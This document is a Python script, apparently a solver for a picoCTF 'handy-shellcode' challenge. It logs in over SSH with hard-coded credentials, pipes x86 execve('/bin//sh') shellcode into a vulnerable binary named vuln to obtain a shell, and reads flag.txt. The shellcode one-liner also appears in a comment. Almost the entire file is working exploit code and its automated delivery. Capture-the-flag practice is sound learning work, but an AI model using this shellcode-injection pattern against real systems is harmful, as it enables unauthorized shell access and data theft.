import os
import paramiko
import sys
import warnings
import time


warnings.filterwarnings(action='ignore', module='.*paramiko.*')
#(echo -e '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\';cat)|./vuln

class mySSH:
    def __init__(self, host, user, pwd):
        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.ssh.connect(host, username=user, password=pwd)
        self.ssh_shell = self.ssh.invoke_shell()

    def send(self, msg):
        self.ssh_shell.send(msg+'\n')

    def getMsg(self):
        msg = b''
        time.sleep(3)
        if self.ssh_shell.recv_ready():
            msg += self.ssh_shell.recv(9999)
        print(msg.decode())

    def connect_ssh(self):
        path = "/problems/handy-shellcode_0_24753fd2c78ac1a60682f0c924b23405"
        payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
        self.getMsg()
        self.send('cd '+path)
        self.getMsg()
        self.send('(echo -n -e \'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\';cat)|./vuln')
        self.getMsg()
        self.send('')
        self.getMsg()
        self.send('cat flag.txt')
        self.getMsg()

    def close_ssh(self):
        self.ssh.close()


def main():
    myssh = mySSH('2019shell1.picoctf.com', 'mikon', 'password')
    myssh.connect_ssh()
    myssh.close_ssh()


main()
